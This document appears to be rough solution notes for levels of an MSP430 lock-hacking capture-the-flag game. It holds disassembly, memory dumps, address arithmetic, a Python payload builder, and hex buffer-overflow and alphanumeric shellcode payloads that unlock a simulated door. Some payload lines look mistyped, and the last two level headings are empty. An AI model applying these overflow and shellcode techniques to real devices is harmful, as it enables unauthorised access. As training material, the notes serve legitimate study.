47ce:  3640 0900      mov	#0x9, r6
47d2:  0d4c           mov	r12, r13
47d4:  3740 2500      mov	#0x25, r7
47d8:  7b3c           jmp	#0x48d0 <printf+0x166>
47da:  1a53           inc	r10
47dc:  7f90 2500      cmp.b	#0x25, r15
47e0:  1224           jeq	#0x4806 <printf+0x9c>
47e2:  1c53           inc	r12
47e4:  4e4f           mov.b	r15, r14
47e6:  8e11           sxt	r14
47e8:  0d12           push	r13
47ea:  0e12           push	r14
47ec:  0d12           push	r13
47ee:  0012           push	pc
47f0:  0212           push	sr
47f2:  0f4d           mov	r13, r15
47f4:  8f10           swpb	r15
47f6:  024f           mov	r15, sr
47f8:  32d0 0080      bis	#0x8000, sr
47fc:  b012 1000      call	#0x10
4800:  3241           pop	sr
4802:  3152           add	#0x8, sp
4804:  653c           jmp	#0x48d0 <printf+0x166>
4806:  6e4a           mov.b	@r10, r14
4808:  4e9f           cmp.b	r15, r14
480a:  1020           jne	#0x482c <printf+0xc2>
480c:  1c53           inc	r12
480e:  0d12           push	r13
4810:  0712           push	r7
4812:  0d12           push	r13
4814:  0012           push	pc
4816:  0212           push	sr
4818:  0f4d           mov	r13, r15
481a:  8f10           swpb	r15
481c:  024f           mov	r15, sr
481e:  32d0 0080      bis	#0x8000, sr
4822:  b012 1000      call	#0x10
4826:  3241           pop	sr
4828:  3152           add	#0x8, sp
482a:  503c           jmp	#0x48cc <printf+0x162>
482c:  7e90 7300      cmp.b	#0x73, r14
4830:  1820           jne	#0x4862 <printf+0xf8>
4832:  2e4b           mov	@r11, r14
4834:  0843           clr	r8
4836:  113c           jmp	#0x485a <printf+0xf0>
4838:  1c53           inc	r12
483a:  1e53           inc	r14
483c:  8911           sxt	r9
483e:  0812           push	r8
4840:  0912           push	r9
4842:  0812           push	r8
4844:  0012           push	pc
4846:  0212           push	sr
4848:  0f48           mov	r8, r15
484a:  8f10           swpb	r15
484c:  024f           mov	r15, sr
484e:  32d0 0080      bis	#0x8000, sr
4852:  b012 1000      call	#0x10
4856:  3241           pop	sr
4858:  3152           add	#0x8, sp
485a:  694e           mov.b	@r14, r9
485c:  4993           tst.b	r9
485e:  ec23           jnz	#0x4838 <printf+0xce>
4860:  353c           jmp	#0x48cc <printf+0x162>
4862:  7e90 7800      cmp.b	#0x78, r14
4866:  2c20           jne	#0x48c0 <printf+0x156>
4868:  2e4b           mov	@r11, r14
486a:  2942           mov	#0x4, r9
486c:  243c           jmp	#0x48b6 <printf+0x14c>
486e:  0f4e           mov	r14, r15
4870:  8f10           swpb	r15
4872:  3ff0 ff00      and	#0xff, r15
4876:  12c3           clrc
4878:  0f10           rrc	r15
487a:  0f11           rra	r15
487c:  0f11           rra	r15
487e:  0f11           rra	r15
4880:  069f           cmp	r15, r6
4882:  0438           jl	#0x488c <printf+0x122>
4884:  084f           mov	r15, r8
4886:  3850 3000      add	#0x30, r8
488a:  033c           jmp	#0x4892 <printf+0x128>
488c:  084f           mov	r15, r8
488e:  3850 5700      add	#0x57, r8
4892:  0d12           push	r13
4894:  0812           push	r8
4896:  0d12           push	r13
4898:  0012           push	pc
489a:  0212           push	sr
489c:  0f4d           mov	r13, r15
489e:  8f10           swpb	r15
48a0:  024f           mov	r15, sr
48a2:  32d0 0080      bis	#0x8000, sr
48a6:  b012 1000      call	#0x10
48aa:  3241           pop	sr
48ac:  3152           add	#0x8, sp
48ae:  0e5e           add	r14, r14
48b0:  0e5e           add	r14, r14
48b2:  0e5e           add	r14, r14
48b4:  0e5e           add	r14, r14
48b6:  3953           add	#-0x1, r9
48b8:  3993           cmp	#-0x1, r9
48ba:  d923           jne	#0x486e <printf+0x104>
48bc:  2c52           add	#0x4, r12
48be:  063c           jmp	#0x48cc <printf+0x162>
48c0:  7e90 6e00      cmp.b	#0x6e, r14
48c4:  0320           jne	#0x48cc <printf+0x162>
48c6:  2f4b           mov	@r11, r15
48c8:  8f4c 0000      mov	r12, 0x0(r15)
48cc:  2b53           incd	r11
48ce:  1a53           inc	r10
48d0:  6f4a           mov.b	@r10, r15
48d2:  4f93           tst.b	r15
48d4:  8223           jnz	#0x47da <printf+0x70>
48d6:  1144 f0ff      mov	-0x10(r4), sp
48da:  2153           incd	sp
48dc:  3441           pop	r4
48de:  3641           pop	r6
48e0:  3741           pop	r7
48e2:  3841           pop	r8
48e4:  3941           pop	r9
48e6:  3a41           pop	r10
48e8:  3b41           pop	r11
48ea:  3041           ret
48ec <_INT>
48ec:  1e41 0200      mov	0x2(sp), r14
48f0:  0212           push	sr
48f2:  0f4e           mov	r14, r15
48f4:  8f10           swpb	r15
48f6:  024f           mov	r15, sr
48f8:  32d0 0080      bis	#0x8000, sr
48fc:  b012 1000      call	#0x10
4900:  3241           pop	sr
4902:  3041           ret
4904 <INT>
4904:  0c4f           mov	r15, r12
4906:  0d12           push	r13
4908:  0e12           push	r14
490a:  0c12           push	r12
490c:  0012           push	pc
490e:  0212           push	sr
4910:  0f4c           mov	r12, r15
4912:  8f10           swpb	r15
4914:  024f           mov	r15, sr
4916:  32d0 0080      bis	#0x8000, sr
491a:  b012 1000      call	#0x10
491e:  3241           pop	sr
4920:  3152           add	#0x8, sp
4922:  3041           ret
4924 <putchar>
4924:  0e4f           mov	r15, r14
4926:  0d43           clr	r13
4928:  0d12           push	r13
492a:  0e12           push	r14
492c:  0d12           push	r13
492e:  0012           push	pc
4930:  0212           push	sr
4932:  0f4d           mov	r13, r15
4934:  8f10           swpb	r15
4936:  024f           mov	r15, sr
4938:  32d0 0080      bis	#0x8000, sr
493c:  b012 1000      call	#0x10
4940:  3241           pop	sr
4942:  3152           add	#0x8, sp
4944:  0f4e           mov	r14, r15
4946:  3041           ret
4948 <getchar>
4948:  2183           decd	sp
494a:  0d43           clr	r13
494c:  1e43           mov	#0x1, r14
494e:  0c41           mov	sp, r12
4950:  0d12           push	r13
4952:  0c12           push	r12
4954:  0e12           push	r14
4956:  0012           push	pc
4958:  0212           push	sr
495a:  0f4e           mov	r14, r15
495c:  8f10           swpb	r15
495e:  024f           mov	r15, sr
4960:  32d0 0080      bis	#0x8000, sr
4964:  b012 1000      call	#0x10
4968:  3241           pop	sr
496a:  3152           add	#0x8, sp
496c:  6f41           mov.b	@sp, r15
496e:  8f11           sxt	r15
4970:  2153           incd	sp
4972:  3041           ret
4974 <getsn>
4974:  0d4f           mov	r15, r13
4976:  2c43           mov	#0x2, r12
4978:  0e12           push	r14
497a:  0d12           push	r13
497c:  0c12           push	r12
497e:  0012           push	pc
4980:  0212           push	sr
4982:  0f4c           mov	r12, r15
4984:  8f10           swpb	r15
4986:  024f           mov	r15, sr
4988:  32d0 0080      bis	#0x8000, sr
498c:  b012 1000      call	#0x10
4990:  3241           pop	sr
4992:  3152           add	#0x8, sp
4994:  3041           ret
4996 <puts>
4996:  0e4f           mov	r15, r14
4998:  0c43           clr	r12
499a:  103c           jmp	#0x49bc <puts+0x26>
499c:  1e53           inc	r14
499e:  8d11           sxt	r13
49a0:  0c12           push	r12
49a2:  0d12           push	r13
49a4:  0c12           push	r12
49a6:  0012           push	pc
49a8:  0212           push	sr
49aa:  0f4c           mov	r12, r15
49ac:  8f10           swpb	r15
49ae:  024f           mov	r15, sr
49b0:  32d0 0080      bis	#0x8000, sr
49b4:  b012 1000      call	#0x10
49b8:  3241           pop	sr
49ba:  3152           add	#0x8, sp
49bc:  6d4e           mov.b	@r14, r13
49be:  4d93           tst.b	r13
49c0:  ed23           jnz	#0x499c <puts+0x6>
49c2:  0e43           clr	r14
49c4:  3d40 0a00      mov	#0xa, r13
49c8:  0e12           push	r14
49ca:  0d12           push	r13
49cc:  0e12           push	r14
49ce:  0012           push	pc
49d0:  0212           push	sr
49d2:  0f4e           mov	r14, r15
49d4:  8f10           swpb	r15
49d6:  024f           mov	r15, sr
49d8:  32d0 0080      bis	#0x8000, sr
49dc:  b012 1000      call	#0x10
49e0:  3241           pop	sr
49e2:  3152           add	#0x8, sp
49e4:  0f4e           mov	r14, r15
49e6:  3041           ret
49e8 <_memcpy>
49e8:  1c41 0600      mov	0x6(sp), r12
49ec:  0f43           clr	r15
49ee:  093c           jmp	#0x4a02 <_memcpy+0x1a>
49f0:  1e41 0200      mov	0x2(sp), r14
49f4:  0e5f           add	r15, r14
49f6:  1d41 0400      mov	0x4(sp), r13
49fa:  0d5f           add	r15, r13
49fc:  ee4d 0000      mov.b	@r13, 0x0(r14)
4a00:  1f53           inc	r15
4a02:  0f9c           cmp	r12, r15
4a04:  f523           jne	#0x49f0 <_memcpy+0x8>
4a06:  3041           ret
4a08 <_bzero>
4a08:  0d43           clr	r13
4a0a:  053c           jmp	#0x4a16 <_bzero+0xe>
4a0c:  0c4f           mov	r15, r12
4a0e:  0c5d           add	r13, r12
4a10:  cc43 0000      mov.b	#0x0, 0x0(r12)
4a14:  1d53           inc	r13
4a16:  0d9e           cmp	r14, r13
4a18:  f923           jne	#0x4a0c <_bzero+0x4>
4a1a:  3041           ret
4a1c <rand>
4a1c:  0e43           clr	r14
4a1e:  3d40 2000      mov	#0x20, r13
4a22:  0e12           push	r14
4a24:  0e12           push	r14
4a26:  0d12           push	r13
4a28:  0012           push	pc
4a2a:  0212           push	sr
4a2c:  0f4d           mov	r13, r15
4a2e:  8f10           swpb	r15
4a30:  024f           mov	r15, sr
4a32:  32d0 0080      bis	#0x8000, sr
4a36:  b012 1000      call	#0x10
4a3a:  3241           pop	sr
4a3c:  3152           add	#0x8, sp
4a3e:  0f4f           mov	r15, r15
4a40:  3041           ret
4a42 <conditional_unlock_door>
4a42:  2183           decd	sp
4a44:  0e4f           mov	r15, r14
4a46:  3d40 7e00      mov	#0x7e, r13
4a4a:  0c41           mov	sp, r12
4a4c:  0c12           push	r12
4a4e:  0e12           push	r14
4a50:  0d12           push	r13
4a52:  0012           push	pc
4a54:  0212           push	sr
4a56:  0f4d           mov	r13, r15
4a58:  8f10           swpb	r15
4a5a:  024f           mov	r15, sr
4a5c:  32d0 0080      bis	#0x8000, sr
4a60:  b012 1000      call	#0x10
4a64:  3241           pop	sr
4a66:  3152           add	#0x8, sp
4a68:  0f43           clr	r15
4a6a:  2153           incd	sp
4a6c:  3041           ret
4a6e <_unexpected_>
4a6e:  0013           reti	pc


0xcaaa-0xc740 = 874 = 0x36a

pc  df0c  sp  d75a  sr  0004  cg  0000
r04 0000  r05 5a08  r06 0000  r07 0000
r08 0000  r09 0000  r10 4343  r11 4444
r12 0000  r13 000a  r14 d750  r15 d750

3041
ret

d720:   0000 0000 5ce0 0000 4ce0 0000 3000 0000   ....\...L...0...
d730:   0000 1cdf 0000 0000 0000 3ad7 0000 0000   ..........:.....
d740:   0000 fade 0300 eade 0000 0a00 50d7 0000   ............P...
d750:   1cdf 4141 4242 4343 4444 4545 4646 4747   ..AABBCCDDEEFFGG
d760:   4848 4949 4a4a 0000 0000 0000 0000 0000   HHIIJJ..........

4762:  8e12           call	r14
45e4:  8c12           call	r12

4242424242424242[call_r14]30127f00b012[int]



call_r14 = leaked - 0x36a + 0x362 = leaked - 0x8
int = leaked - 1284 = leaked - 0x504

leaked - 0x36a + 4912 - 4400

leaked = 9b48
call_r14 = 9b40
int = ...

4242424242424242409b30127f00b012cdab
```

```
leaked = d538
call_r14 = d530
int = d02c
424242424242424230d430127; f00b0122cd0
```
as determined by: 
```
import sys
leaked = int(sys.argv[1],16)
call_r14 = "%04x"%(leaked - 8)
int_addr = "%04x"%(leaked + 0x1a8)
call_r14 = call_r14[2:4] + call_r14[0:2]
int_addr = int_addr[2:4] + int_addr[0:2]
print("4242424242424242" + call_r14 + "3f407f003040" + int_addr)
```


## 15. Lagos

```
41
41414141414141414141414141414141
3044
414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141
[code]

4f42           mov.b	sr, r15
4f43           mov.b	#0x0, r15
4f44           mov.b	r4, r15
4f45           mov.b	r5, r15
4f46           mov.b	r6, r15
4f47           mov.b	r7, r15
4f48           mov.b	r8, r15
4f49           mov.b	r9, r15
4f4a           mov.b	r10, r15
4f4b           mov.b	r11, r15
4f4c           mov.b	r12, r15
4f4d           mov.b	r13, r15
4f4e           mov.b	r14, r15
4f4f           mov.b	r15, r15
4f50           add.b	pc, r15
4f51           add.b	sp, r15
4f52           add.b	sr, r15
4f53           add.b	#0x0, r15
4f54           add.b	r4, r15
4f55           add.b	r5, r15
4f56           add.b	r6, r15
4f57           add.b	r7, r15
4f58           add.b	r8, r15
4f59           add.b	r9, r15
4f5a           add.b	r10, r15
4f61           addc.b	sp, r15
4f62           addc.b	sr, r15
4f63           adc.b	r15
4f64           addc.b	r4, r15
4f65           addc.b	r5, r15
4f66           addc.b	r6, r15
4f67           addc.b	r7, r15
4f68           addc.b	r8, r15
4f69           addc.b	r9, r15
4f6a           addc.b	r10, r15
4f6b           addc.b	r11, r15
4f6c           addc.b	r12, r15
4f6d           addc.b	r13, r15
4f6e           addc.b	r14, r15
4f6f           addc.b	r15, r15
4f70           subc.b	pc, r15
4f71           subc.b	sp, r15
4f72           subc.b	sr, r15
4f73           sbc.b	r15
4f74           subc.b	r4, r15
4f75           subc.b	r5, r15
4f76           subc.b	r6, r15
4f77           subc.b	r7, r15
4f78           subc.b	r8, r15
4f79           subc.b	r9, r15
4f7a           subc.b	r10, r15

460c:  b012 1000      call	#0x10


4f4b           mov.b	r11, r15

jge $+0xf6	7a34

414141414141414141414141414141414130444141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414242
41414141414141414141414141414141413044414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141[code]

414141414141414141414141414141414130444141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414f4b4f6b7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a34

414141414141414141414141414141414130444141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141417a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a4f4b4f6b7a34


414141414141414141414141414141414130444141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141417a7a7a7a7a7a7a7a4f4b4f6b7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a34



414141414141414141414141414141414130444141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141417a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a4f4b4f6b4f6b4f6b4f527a34
```

## 16. Bangalore
## 17. Chernobyl
